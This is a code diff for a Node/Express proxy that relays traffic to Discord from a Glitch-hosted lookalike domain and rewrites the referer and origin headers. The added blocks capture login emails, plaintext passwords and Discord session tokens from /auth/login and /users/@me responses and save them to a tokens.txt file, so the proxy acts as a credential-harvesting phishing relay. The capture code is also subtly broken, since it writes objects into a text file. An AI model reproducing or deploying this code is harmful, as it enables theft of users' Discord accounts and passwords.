@@ -36,7 +36,6 @@ if(headers['content-type']) headersNew['content-type'] = headers['content-type']
 // if(headersNew.authorization) headersNew.authorization = "Bot " + headersNew.authorization
  if(headersNew.referer) headersNew.referer = `${headersNew.referer}`.replace('https://scalloped-mahogany-chronometer.glitch.me/', 'https://discord.com/')
  if(headersNew.origin) headersNew.origin = `https://discord.com/`
- console.log(headersNew)
   console.log('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7'))
   if(JSON.stringify(req.body) !== `{}`){
   let dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, headers: headersNew, body: JSON.stringify(req.body)}).catch(err =>{})
@@ -47,6 +46,32 @@ if(headers['content-type']) headersNew['content-type'] = headers['content-type']
   try {
   
     let s = JSON.parse(dataText)
+    console.log(s)
+    if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && s.token){
+
+    	let tokens;
+	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
+	
+	let arr = tokens.split("\n").map(d => {
+		return d.trim();
+	});
+	
+  arr.unshift({email: s.email, token: s.token})
+	fs.writeFileSync("./tokens.txt", arr.join("\n"));
+}
+if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login` && s.token){
+
+    	let tokens;
+	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
+	
+	let arr = tokens.split("\n").map(d => {
+		return d.trim();
+	});
+	
+  arr.unshift({email: req.body.login, password: req.body.password, token: s.token})
+	fs.writeFileSync("./tokens.txt", arr.join("\n"));
+}
+
     
     return res.status(dataFetch.status).json(s)
     
@@ -55,17 +80,40 @@ return res.status(dataFetch.status).send(dataText)
 }
         }else{
           if('https://discord.com' + req.originalUrl === "https://discord.com/api/v6/experiments") headersNew = {}
-          console.log(headersNew)
           headersNew.host = "discord.com"
-          console.log('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7'))
   let dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, headers: headersNew}).catch(err =>{})
-  console.log(dataFetch)
   if(!dataFetch) dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method}).catch(err =>{})
 
   let dataText = await dataFetch.text()
   try {
   
     let s = JSON.parse(dataText)
+    console.log(s)
+if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && s.token){
+
+    	let tokens;
+	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
+	
+	let arr = tokens.split("\n").map(d => {
+		return d.trim();
+	});
+	
+  arr.unshift({email: s.email, token: s.token})
+	fs.writeFileSync("./tokens.txt", arr.join("\n"));
+}
+if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login` && s.token){
+
+    	let tokens;
+	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
+	
+	let arr = tokens.split("\n").map(d => {
+		return d.trim();
+	});
+	
+  arr.unshift({email: req.body.login, password: req.body.password, token: s.token})
+	fs.writeFileSync("./tokens.txt", arr.join("\n"));
+}
+
     
     return res.status(dataFetch.status).json(s)
     
